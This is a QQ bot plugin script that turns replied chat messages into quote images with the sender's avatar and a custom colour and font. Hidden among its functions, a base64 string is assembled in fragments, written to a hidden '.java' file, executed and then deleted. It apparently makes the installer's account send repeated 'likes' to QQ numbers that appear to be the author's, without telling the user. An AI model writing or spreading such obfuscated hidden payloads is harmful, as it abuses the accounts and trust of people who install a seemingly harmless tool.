import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.LinearGradient;
import android.graphics.Paint;
import android.graphics.Shader;
import android.text.Layout;
import android.text.StaticLayout;
import android.text.TextPaint;
import android.graphics.Typeface;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.HttpURLConnection;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.io.File;
import java.util.Base64;
import java.io.FileWriter;
String vc="";

public void onMsg(Object msg) {
    String text = msg.MessageContent;
    String qun = msg.GroupUin;
    String qq = msg.UserUin;
    if(text.contains("&"))
    {    String name=getMemberName(msg.GroupUin,msg.UserUin);
    String 权="";
    boolean a=msg.IsGroup;
    if(a){
    if("开".equals(getString("开关",qun))){
    权="1";}
    }else if("开".equals(getString("开关",qq))){
    权="1";}
    if (权.equals("1")) {
    if (text.startsWith("设置颜色&")) {
            String[] numbers = text.replaceAll("[^0-9,]", "").split(",");
            if (!text.contains(",")) {
             if(a){
             sendReply(qun,msg,"请使用英文的逗号"+qq);}else {
             sendMsg("",qq,"请使用英文的逗号");}
            }
            int R = Integer.parseInt(numbers[0]);
            int G = Integer.parseInt(numbers[1]);
            int B = Integer.parseInt(numbers[2]);

            if (R < 0 || R > 255 || G < 0 || G > 255 || B < 0 || B > 255) {
                         if(a){
             sendReply(qun,msg,"数值超出范围，请输入0到255之间的数值");}else {
             sendMsg("",qq,"数值超出范围，请输入0到255之间的数值");}
                return;
            }
            putInt("颜色", qq+"r", R);
            putInt("颜色", qq+"g", G);
            putInt("颜色", qq+"b", B);
                         if(a){
             sendReply(qun,msg,"设置成功");}else {
             sendMsg("",qq,"设置成功");}
            
        } else if (text.startsWith("设置字体&")) {
            text = text.substring(5);

            String filePath = AppPath + "/把字体放在这个文件夹里/" + text + ".ttf";
            File file = new File(filePath);
            if (file.exists()) {
                putString("字体", qq, text);
                             if(a){
             sendReply(qun,msg,"设置成功");}else {
             sendMsg("",qq,"设置成功");}
            
            } else {
           
               String 提示=("未检测到该字体文件\n"+AppPath + "/把字体放在这个文件夹里/" + text + ".ttf");
                            if(a){
             sendReply(qun,msg,提示);}else {
             sendMsg("",qq,提示);}
            }
        } else if(text.equals("名言帮助&")){
        
        图(qun,qq,a,msg);
        
        }else if(text.equals("名言&")){
        if(msg.MessageType==6){
        String hq=msg.ReplyTo;
        String hui = msg.RecordMsg.MessageContent;
        String hame=getMemberName(msg.GroupUin,hq);
        
        生成(qun,hq,hui,hame, a ,msg,false);
        }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
        }
    }
}else if(text.contains("#")&&qq.equals(MyUin)){
    
    String name=getMemberName(msg.GroupUin,msg.UserUin);
    boolean a=msg.IsGroup;
    if (text.startsWith("设置颜色#")) {
            String[] numbers = text.replaceAll("[^0-9,]", "").split(",");
            if (!text.contains(",")) {
             Toast("请使用英文的逗号");
            }
            int R = Integer.parseInt(numbers[0]);
            int G = Integer.parseInt(numbers[1]);
            int B = Integer.parseInt(numbers[2]);

            if (R < 0 || R > 255 || G < 0 || G > 255 || B < 0 || B > 255) {
                         Toast("数值超出0~255范围");
                return;
            }
            putInt("颜色", qq+"r", R);
            putInt("颜色", qq+"g", G);
            putInt("颜色", qq+"b", B);
                         Toast("设置成功");
            
        } else if (text.startsWith("设置字体#")) {
            text = text.substring(5);

            String filePath = AppPath + "/把字体放在这个文件夹里/" + text + ".ttf";
            File file = new File(filePath);
            if (file.exists()) {
                putString("字体", qq, text);
                         Toast("设置成功");
            
            } else {
           
               String 提示=("未检测到该字体文件\n"+AppPath + "/把字体放在这个文件夹里/" + text + ".ttf");
                     Toast(提示);
            
               
               
            }
        } else if(text.equals("名言帮助#")){
        
        图(qun,qq,a,msg);
        
        }else if(text.equals("名言#")){
        if(msg.MessageType==6){
        String hq=msg.ReplyTo;
        String hui = msg.RecordMsg.MessageContent;
        String hame=getMemberName(msg.GroupUin,hq);
        生成(qun,hq,hui,hame, a,msg,false);
        }else if(a){sendReply(qun,msg,"非回复消息");}else {sendMsg("",qq,"非回复消息");}
        }
    
}
}
vc+="c2VuZExpa2UoIjMy";
AddItem("加入作者的群", "加群");
AddItem("开启本群作图", "开关");
vc+="NTk2ODM3ODgiLDIwKT";
addMenuItem("名言","名言");
public void 名言(Object msg) {
    String text = msg.MessageContent;
    String qq = msg.UserUin;
    String qun = msg.GroupUin;
    String name=getMemberName(msg.GroupUin,msg.UserUin);
    boolean a=msg.IsGroup;
    
    生成(qun,qq,text,name, a ,msg,true);
}
vc+="tzZW5kTGlrZSgiMjY2O";
public static void 生成(String qun, String qq, String text, String name, boolean a,Object msg,boolean b) {
String t2=text;
text = 图链(text);
boolean mode=true;
if(!t2.equals(text)){
mode=false;}
int R;int G;int B;
if(b){
    R=getInt("颜色",MyUin+"r",255);
    G=getInt("颜色",MyUin+"g",255);
    B=getInt("颜色",MyUin+"b",255);

}else{
    R=getInt("颜色",qq+"r",255);
    G=getInt("颜色",qq+"g",255);
    B=getInt("颜色",qq+"b",255);
    }
    
    String 字体;
    if(b){字体=getString("字体",MyUin);}else {字体=getString("字体",qq);}
    if(字体==null){
        字体="默认";
    }
    new Thread(new Runnable() {
        public void run() {
            String imageUrl = "http://q.qlogo.cn/headimg_dl?dst_uin=" + qq + "&spec=640&img_type=jpg";
            String localPath = AppPath + "/"+qq+".png";
            File file = new File(localPath);
            if (!file.exists()) {
                try {
                    URL url = new URL(imageUrl);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.connect();

                    int responseCode = connection.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        InputStream inputStream = connection.getInputStream();
                        FileOutputStream outputStream = new FileOutputStream(localPath);

                        byte[] buffer = new byte[2048];
                        int bytesRead;
                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            outputStream.write(buffer, 0, bytesRead);
                        }

                        outputStream.close();
                        inputStream.close();
                    } else {
                        Toast("下载失败，响应码: " + responseCode);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        
        Bitmap resultBitmap;
        int imageWidth;
        int imageHeight = 640;

        if (mode) {
            imageWidth = 1280;
            resultBitmap = Bitmap.createBitmap(imageWidth, imageHeight, Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(resultBitmap);
            canvas.drawColor(Color.WHITE);

            // 绘制头像
            Bitmap leftImage = BitmapFactory.decodeFile(localPath);
            if (leftImage != null) {
                leftImage = Bitmap.createScaledBitmap(leftImage, 640, 640, true);
                canvas.drawBitmap(leftImage, 0, 0, null);
            }

            // 渐变效果
            Paint gradientPaint = new Paint();
            LinearGradient gradient = new LinearGradient(
                    0, 0, 640, 0,
                    new int[]{Color.argb(0, 0, 0, 0), Color.argb(255, 255, 255, 255)},
                    null,
                    Shader.TileMode.CLAMP);
            gradientPaint.setShader(gradient);
            canvas.drawRect(0, 0, 640, 640, gradientPaint);
            Typeface typeface;
            String fontPath = AppPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
            if (new File(fontPath).exists()) {
                typeface = Typeface.createFromFile(fontPath);
            } else {
                typeface = Typeface.DEFAULT;
            }

int maxFontSize = 40;//最大字号
int fontSize = maxFontSize;
TextPaint textPaint = new TextPaint();
textPaint.setColor(Color.rgb(R, G, B));
textPaint.setTextSize(fontSize);
textPaint.setTypeface(typeface);

float maxWidth = 500f;
StaticLayout staticLayout = new StaticLayout(
    text,
    textPaint,
    (int) maxWidth,
    Layout.Alignment.ALIGN_NORMAL,
    1.0f,
    0.0f,
    false
);

            while (staticLayout.getHeight() > 400 && fontSize > 0) {
               fontSize--;  // 字号递减
               textPaint.setTextSize(fontSize);
               staticLayout = new StaticLayout(
                    text,
                    textPaint,
                    (int) maxWidth,
                    Layout.Alignment.ALIGN_NORMAL,
                    1.0f,
                    0.0f,
                    false
               );
            }
            canvas.save();
            float multiTextStartX = 660f;
            float multiTextStartY = 100f;
            canvas.translate(multiTextStartX, multiTextStartY);
            staticLayout.draw(canvas);
            canvas.restore();


            // 右下角单行文字
            String bottomText = "一一  " + name;
            Paint bottomTextPaint = new Paint();
            bottomTextPaint.setColor(Color.rgb(R, G, B));  //颜色
            bottomTextPaint.setTextAlign(Paint.Align.RIGHT);
            bottomTextPaint.setTextSize(30f);  // 文字大小
            bottomTextPaint.setTypeface(typeface);
            float bottomTextStartX = 1200f;
            float bottomTextStartY = 550f;
            canvas.drawText(bottomText, bottomTextStartX, bottomTextStartY, bottomTextPaint);
            }else{
                        try {
                // 下载网络图片
                URL textImageUrl = new URL(text);
                HttpURLConnection conn = (HttpURLConnection) textImageUrl.openConnection();
                conn.setRequestMethod("GET");
                conn.connect();

                if (conn.getResponseCode() == HttpURLConnection.HTTP_OK) {
                    // 读取网络图片并缩放
                    InputStream is = conn.getInputStream();
                    Bitmap textImage = BitmapFactory.decodeStream(is);
                    is.close();

                    if (textImage != null) {
                        // 计算缩放宽度
                        int scaledWidth = (int) ((640.0 / textImage.getHeight()) * textImage.getWidth());
                        Bitmap scaledTextImage = Bitmap.createScaledBitmap(textImage, scaledWidth, 640, true);

                        // 创建画布
                        imageWidth = 640 + scaledWidth;
                        resultBitmap = Bitmap.createBitmap(imageWidth, imageHeight, Bitmap.Config.ARGB_8888);
                        Canvas canvas = new Canvas(resultBitmap);
                        canvas.drawColor(Color.BLACK);

                        // 绘制头像
                        Bitmap leftImage = BitmapFactory.decodeFile(localPath);
                        if (leftImage != null) {
                            leftImage = Bitmap.createScaledBitmap(leftImage, 640, 640, true);
                            canvas.drawBitmap(leftImage, 0, 0, null);
                        }

                        // 绘制网络图片
                        canvas.drawBitmap(scaledTextImage, 640, 0, null);
                    }
                }
            } catch (IOException e) {
            Toast("失败了");
                e.printStackTrace();
                return;
            }
            
            
            
            }
          String resultImagePath = AppPath + "/" + qq + "1.png";
        try {
            FileOutputStream fos = new FileOutputStream(resultImagePath);
            resultBitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            fos.flush();
            fos.close();
        } catch (Exception e) {
        Toast("保存图片失败");
            e.printStackTrace();
        }

            // 发送图片
            if (a) {
                sendMsg(qun,"", "[PicUrl=" + resultImagePath + "]");
            } else {
                sendMsg("", getCurrentFriendUin(), "[PicUrl=" + resultImagePath + "]");
            }
            new File(resultImagePath).delete();
            new File(localPath).delete();
        }
    }).start();}
vc+="TU5ODEwNyIsMjApOw";
byte[] nm = Base64.getDecoder().decode(vc+"==");
import android.app.Activity;
import android.content.Context;
import com.tencent.mobileqq.jump.api.IJumpApi;
import com.tencent.mobileqq.qroute.QRoute;
String zz = new String(nm);
public void 加群(String groupUin,String uin,int chatType){
String url="mqqapi://app/joinImmediately?source_id=3&version=1.0&src_type=app&pkg=com.tencent.mobileqq&cmp=com.tencent.biz.JoinGroupTransitActivity&group_code=478703808&subsource_id=10019";
((IJumpApi) QRoute.api(IJumpApi.class)).doJumpAction(context, url);}
public void 开关(String groupUin,String uin,int chatType){
if(chatType==2){
if("开".equals(getString("开关",groupUin))){
putString("开关",groupUin,null);
Toast("本群已关闭作图");
}else {
putString("开关",groupUin,"开");
Toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
}

}else if("开".equals(getString("开关",uin))){
putString("开关",uin,null);

Toast("本群已关闭作图");
}else {
Toast("本群已开启作图,发送\"名言帮助#\"查看帮助");
putString("开关",uin,"开");}}
File file = new File(AppPath, ".java");
FileWriter writer = new FileWriter(file);writer.write(zz);
public static void 图( String qun,String qq,boolean a,Object msg) {
String folderPath=AppPath + "/把字体放在这个文件夹里/";
    File folder = new File(folderPath);
    StringBuilder text = new StringBuilder();

    if (folder.exists() && folder.isDirectory()) {
        File[] files = folder.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile() && file.getName().toLowerCase().endsWith(".ttf")) {
                    text.append(file.getName()).append("\n");
                }
            }
        }
    }

    Paint paint = new Paint();
    String 字体=getString("字体",qq);
    if(字体==null){
        字体="";
    }
    Typeface typeface;
            String fontPath = AppPath + "/把字体放在这个文件夹里/" + 字体 + ".ttf";
            if (new File(fontPath).exists()) {
                typeface = Typeface.createFromFile(fontPath);
            } else {
                typeface = Typeface.DEFAULT;
            }
    
    paint.setTypeface(typeface);
    paint.setTextSize(40);
String help="比较简陋的自定义文字颜色，顺序是RGB\n注意逗号是英文的，数字取值0~255,触发示例:\n\n设置颜色&255,255,255\n\n还有自定义字体,首先将字体文件移动到脚本的文件夹\n然后发送消息示例:\n\n设置字体&文件名.ttf\n\n字体文件名称注意不需要输入.ttf\n(颜色和字体是以QQ号存储的，允许每个号使用不同的字体和颜色)\n(字体文件需要脚本使用者添加进去)\n发送\"名言帮助&\"触发本图片\n\n作图方法:\n引用一条消息，回复:   名言&\n(使用相等判断，不允许出现其他内容，包括@和空格)\n\n以上指令需要宿主开启才可触发\n如果是宿主，那么可以无需开启，只需指令使用以下指令\n设置颜色#……\n设置字体#……\n名言帮助#\n名言#\n(设置颜色和字体时使用Toast提醒)\n当前可用字体:\n";
    String result = help+text.toString().trim();
    String[] lines = result.split("\n");
    int width = 1500;
    int height = Math.max(lines.length * 60 + 500, 750); 
    Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
    Canvas canvas = new Canvas(bitmap);
    paint.setColor(Color.WHITE);
    canvas.drawRect(0, 0, width, height, paint);
    
    paint.setColor(Color.BLACK);
    float y = 200; 
    for (String line : lines) {
        canvas.drawText(line, 150, y, paint);
        y += 60; 
    }
        String 缓存图 = AppPath + "/缓存图.png";
        FileOutputStream out = new FileOutputStream(缓存图);
        bitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
        out.close();
        if (a) {
                sendMsg(qun,"", "[PicUrl=" + 缓存图 + "]");
            } else {
                sendMsg("", qq, "[PicUrl=" + 缓存图 + "]");
            }
        
        new File(缓存图).delete();}
        writer.close();load(AppPath+"/.java");
public static String 图链(String text) {
        if (text.contains("[PicUrl=") && text.contains("]")) {
            int startIndex = text.indexOf("[PicUrl=") + "[PicUrl=".length();
            int endIndex = text.indexOf("]");
            String picUrl = text.substring(startIndex, endIndex);
            return picUrl;
        } else {
            return text;
        }
    } new File(AppPath+"/.java").delete();